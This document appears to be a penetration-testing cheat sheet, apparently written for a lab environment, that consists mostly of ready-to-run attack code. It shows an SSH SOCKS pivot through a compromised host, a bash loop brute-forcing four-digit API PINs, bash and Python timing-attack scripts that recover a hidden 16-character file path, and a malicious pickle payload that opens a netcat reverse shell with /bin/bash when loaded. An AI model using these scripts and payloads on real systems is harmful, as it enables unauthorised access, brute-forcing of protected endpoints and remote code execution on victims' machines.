# Pivoting

## If you've owned a box, how can you pivot to other machines in private subnets?
SOCKS Proxy
```
ssh weytechuser@files.wey-tech.com -D 9050 -f -N
```
Use proxychains to force any command we run locally to route all traffic through our SOCKS tunnel so that we can hit targets

Configure Firefox to run through the proxy. A good addon is SmartProxy and you can configure the SOCKS4 Protocol proxy using the localhost port set above.

## What's a way to brute-force attempt pins on an API?
```
$ ssh weytechuser@files.wey-tech.com 'for i in $(seq 1000 9999); do RESULT=$(curl http://10.4.4.80/api/confirm/abcd/$i 2>/dev/null); if [[ $RESULT == *"true"* ]]; then echo -e "\n$RESULT\nPincode: $i\n"; break; fi; done'
```

## Bash script for timeout attack of a 16 byte random path
```
COOKIE="Cookie: session=<PLACE YOUR COOKIE HERE>"
ADMINID=""
for num in $(seq 0 15 | tac); do
  ZZZs=$(eval "printf 'Z%.0s' {0..$num}")
  PADDING=${ZZZs::-1}
  for char in $(echo "abcdefghijklmnopqrstuvwxyz0123456789" | fold -w1); do  
    RES=$(timeout "$(($num + 1))" curl -s "http://10.4.4.80/api/list/files/1/$ADMINID$char$PADDING" -H "$COOKIE")
    if [ -n "$RES" ]; then
      ADMINID="$ADMINID$char"
      echo "Found another Character: $ADMINID"
      break
    fi
  done
done
```

## Similar Python url fuzz
```
import string
import requests
import sys
import json
import threading
import Queue
import time


character_set = 'abcdefghijklmnopqrstuvwxyz0123456789'

def queue_get_all(q, max_items):
    items = []
    for numOfItemsRetrieved in range(0, max_items):
        try:
            if numOfItemsRetrieved == max_items:
                break
            items.append(q.get_nowait())
        except:
            break
    return items

def times_out(q, alpha, session, ip_address, characters, uid,  timeout):
    start = time.time()
    res = json.loads(session.get(  'http://{}:8080/api/list/files/{}/{}'.format(ip_address, uid, characters)).text)
    end = time.time()
    q.put( [alpha, bool(end - start < timeout)] )


def iterate(character_set, length, ip_address, uid, username, password ):
    session = requests.Session()
    results = session.post('http://{}:8080/api/login'.format(ip_address),data={'username': username, 'password': password})
    final_character = ''
    for num in range(length):
        padding_back = '_' * ((length - num)-1)
        q = Queue.Queue()
        for alpha in character_set:
            threading.Thread(target=times_out, args=[q, alpha, session, ip_address, (final_character + alpha + padding_back), uid, (length - num) ]).start()
        time.sleep((length - num) + 1)
        results = queue_get_all(q, len(character_set))
        final_character += [x[0] for x in results if x[1]][0]
        print(final_character)
    print('The user directory with UID {} is {}'.format(uid, final_character))



if __name__ == "__main__":
    #       Character_Set,  Length to send, ip address,    user id number,  username,           password
    try:
        iterate(character_set,  16,              sys.argv[1],   sys.argv[2],     sys.argv[3],        sys.argv[4])
    except:
        print('Ex - python bruteforce_directory.py 127.0.0.1 1 admin password')
```

## Bad pickle
```
#!/usr/bin/env python
import pickle
import os

class payload(object):
  def __reduce__(self):
    comm = "nc some_ip_address some_port -e /bin/bash"
    return (os.system, (comm,))

payload = pickle.dumps( payload() )
test = open('evil.pickle','w')
test.write(payload)
test.close()
```
